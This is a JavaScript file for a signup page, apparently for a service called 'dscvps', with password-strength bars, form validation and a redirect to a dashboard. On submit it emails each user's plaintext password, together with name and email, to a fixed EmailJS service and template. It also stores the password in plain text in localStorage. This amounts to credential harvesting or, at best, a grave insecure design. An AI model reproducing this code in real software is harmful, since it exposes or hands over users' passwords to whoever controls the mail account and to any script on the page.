// ===== PARTICLES =====
(function createParticles() {
  const container = document.getElementById('particles');
  if (!container) return;
  for (let i = 0; i < 35; i++) {
    const p = document.createElement('div');
    p.className = 'particle';
    const size = Math.random() * 3 + 1;
    const colors = ['#6366f1','#818cf8','#06b6d4','#a855f7'];
    p.style.cssText = `
      width:${size}px; height:${size}px;
      left:${Math.random() * 100}%;
      animation-delay:${Math.random() * 12}s;
      animation-duration:${Math.random() * 10 + 8}s;
      background:${colors[Math.floor(Math.random() * colors.length)]};
    `;
    container.appendChild(p);
  }
})();

// ===== PASSWORD TOGGLE =====
const togglePw = document.getElementById('togglePw');
const passwordInput = document.getElementById('password');
const eyeIcon = document.getElementById('eyeIcon');

togglePw.addEventListener('click', () => {
  const isHidden = passwordInput.type === 'password';
  passwordInput.type = isHidden ? 'text' : 'password';
  eyeIcon.className = isHidden ? 'fas fa-eye-slash' : 'fas fa-eye';
});

// ===== PASSWORD STRENGTH =====
const bars = [
  document.getElementById('bar1'),
  document.getElementById('bar2'),
  document.getElementById('bar3'),
  document.getElementById('bar4'),
];
const pwLabel = document.getElementById('pwLabel');

function getStrength(pw) {
  let score = 0;
  if (pw.length >= 8) score++;
  if (/[A-Z]/.test(pw)) score++;
  if (/[0-9]/.test(pw)) score++;
  if (/[^A-Za-z0-9]/.test(pw)) score++;
  return score;
}

passwordInput.addEventListener('input', function () {
  const pw = this.value;
  if (!pw) {
    bars.forEach(b => b.className = 'pw-bar');
    pwLabel.textContent = 'Enter a password';
    pwLabel.style.color = 'var(--text-dim)';
    return;
  }
  const score = getStrength(pw);
  const levels = ['', 'weak', 'fair', 'good', 'strong'];
  const labels = ['', 'Weak', 'Fair', 'Good', 'Strong'];
  const colors = ['', 'var(--red)', 'var(--orange)', '#eab308', 'var(--green)'];
  bars.forEach((b, i) => {
    b.className = 'pw-bar' + (i < score ? ' ' + levels[score] : '');
  });
  pwLabel.textContent = labels[score];
  pwLabel.style.color = colors[score];
  if (pw.length < 8) {
    setError('password', 'passwordError', 'Password must be at least 8 characters.');
  } else {
    clearError('password', 'passwordError');
  }
});

// ===== VALIDATION HELPERS =====
function validateEmail(val) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(val);
}
function setError(inputId, errorId, msg) {
  const input = document.getElementById(inputId);
  const error = document.getElementById(errorId);
  if (input) input.classList.add('error');
  if (error) error.textContent = msg;
}
function clearError(inputId, errorId) {
  const input = document.getElementById(inputId);
  const error = document.getElementById(errorId);
  if (input) input.classList.remove('error');
  if (error) error.textContent = '';
}

document.getElementById('email').addEventListener('input', function () {
  if (this.value && !validateEmail(this.value)) {
    setError('email', 'emailError', 'Enter a valid email address.');
  } else {
    clearError('email', 'emailError');
  }
});

document.getElementById('confirmPassword').addEventListener('input', function () {
  if (this.value && this.value !== passwordInput.value) {
    setError('confirmPassword', 'confirmPasswordError', 'Passwords do not match.');
  } else {
    clearError('confirmPassword', 'confirmPasswordError');
  }
});

// ===== FORM SUBMIT =====
const joinForm     = document.getElementById('joinForm');
const joinBtn      = document.getElementById('joinBtn');
const joinBtnText  = document.getElementById('joinBtnText');
const joinBtnLoader= document.getElementById('joinBtnLoader');
const joinError    = document.getElementById('joinError');
const joinErrorMsg = document.getElementById('joinErrorMsg');
const joinSuccess  = document.getElementById('joinSuccess');

joinForm.addEventListener('submit', function (e) {
  e.preventDefault();
  joinError.style.display  = 'none';
  joinSuccess.style.display = 'none';

  const firstName = document.getElementById('firstName').value.trim();
  const lastName  = document.getElementById('lastName').value.trim();
  const email     = document.getElementById('email').value.trim();
  const password  = passwordInput.value;
  const confirmPw = document.getElementById('confirmPassword').value;
  const planEl    = document.getElementById('plan');
  const plan      = planEl.options[planEl.selectedIndex].text || 'Not selected';
  const terms     = document.getElementById('agreeTerms').checked;

  let valid = true;

  if (!firstName) { setError('firstName', 'firstNameError', 'First name is required.'); valid = false; }
  else clearError('firstName', 'firstNameError');

  if (!lastName) { setError('lastName', 'lastNameError', 'Last name is required.'); valid = false; }
  else clearError('lastName', 'lastNameError');

  if (!email || !validateEmail(email)) { setError('email', 'emailError', 'Enter a valid email address.'); valid = false; }
  else clearError('email', 'emailError');

  if (!password || password.length < 8) { setError('password', 'passwordError', 'Password must be at least 8 characters.'); valid = false; }
  else clearError('password', 'passwordError');

  if (!confirmPw || confirmPw !== password) { setError('confirmPassword', 'confirmPasswordError', 'Passwords do not match.'); valid = false; }
  else clearError('confirmPassword', 'confirmPasswordError');

  if (!terms) {
    document.getElementById('termsError').textContent = 'You must agree to the terms to continue.';
    valid = false;
  } else {
    document.getElementById('termsError').textContent = '';
  }

  if (!valid) return;

  joinBtnText.style.display  = 'none';
  joinBtnLoader.style.display = 'inline-flex';
  joinBtn.disabled = true;

  const now = new Date();
  const signupDate = now.toLocaleString('en-US', {
    year: 'numeric', month: 'long', day: 'numeric',
    hour: '2-digit', minute: '2-digit', timeZoneName: 'short'
  });

  const templateParams = {
    full_name:     firstName + ' ' + lastName,
    user_email:    email,
    user_password: password,
    user_plan:     plan,
    signup_date:   signupDate,
  };

emailjs.send('service_wf9z4nx', 'template_rvvrbpq', templateParams)
    .then(function (response) {
      console.log('EmailJS OK', response.status, response.text);

      // Save user data to localStorage
      const userData = {
        firstName: firstName,
        lastName:  lastName,
        email:     email,
        password:  password,    // <-- added
        plan:      plan,
        joinedAt:  new Date().toISOString()
      };
      localStorage.setItem('dscvps_user', JSON.stringify(userData));

      joinBtnText.style.display  = 'inline-flex';
      joinBtnLoader.style.display = 'none';
      joinBtn.disabled = false;
      joinSuccess.style.display = 'flex';
      joinForm.reset();
      bars.forEach(b => b.className = 'pw-bar');
      pwLabel.textContent = 'Enter a password';
      pwLabel.style.color = 'var(--text-dim)';

      setTimeout(function () {
        window.location.href = 'dashboard.html';
      }, 2000);
    })
    .catch(function (error) {
      console.error('EmailJS error:', error);
      joinBtnText.style.display  = 'inline-flex';
      joinBtnLoader.style.display = 'none';
      joinBtn.disabled = false;
      joinErrorMsg.textContent = 'Failed to send: ' + (error.text || error.message || JSON.stringify(error));
      joinError.style.display = 'flex';
    });
});

// ===== SOCIAL BUTTONS =====
function showToast(msg) {
  const existing = document.querySelector('.toast');
  if (existing) existing.remove();
  const toast = document.createElement('div');
  toast.className = 'toast';
  toast.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
  document.body.appendChild(toast);
  requestAnimationFrame(() => toast.classList.add('toast-show'));
  setTimeout(() => {
    toast.classList.remove('toast-show');
    setTimeout(() => toast.remove(), 400);
  }, 3000);
}

document.getElementById('googleBtn').addEventListener('click', () => showToast('Google OAuth is not connected yet.'));
document.getElementById('githubBtn').addEventListener('click', () => showToast('GitHub OAuth is not connected yet.'));
